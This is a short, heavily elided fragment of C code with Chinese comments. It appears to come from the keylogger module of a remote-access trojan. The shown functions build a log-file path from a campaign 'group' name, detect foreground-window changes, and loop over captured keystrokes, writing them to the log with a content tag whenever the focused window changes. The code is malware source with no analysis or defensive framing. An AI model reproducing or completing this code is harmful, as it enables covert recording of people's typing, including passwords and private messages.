...
void SaveToFile(const char* group, const CHAR *lpBuffer)
{
    ...
    //随机
    const char* lpTime = group; //防止分组和别人重复

    strcat(strRecordFile,"\\");
    strcat(strRecordFile, lpTime);
...
HWND hFocus = NULL;
BOOL IsWindowsFocusChange(const char* group)
{
...
{
    DLLSERVER_INFO* dll_info = (DLLSERVER_INFO*)lparam;
    const char* group = (char*)dll_info->Group;
    if (KeyStary == FALSE) {
        return 0;
    }
    ...
    while(TRUE) {
        ...
        if (lstrlen(KeyBuffer) != 0) {
            if (IsWindowsFocusChange(group)) {
                SaveToFile(group, "[内容:]");
                SaveToFile(group, KeyBuffer);
                memset(KeyBuffer,0,sizeof(KeyBuffer));
            } else {
                SaveToFile(group, KeyBuffer);
                memset(KeyBuffer,0,sizeof(KeyBuffer));
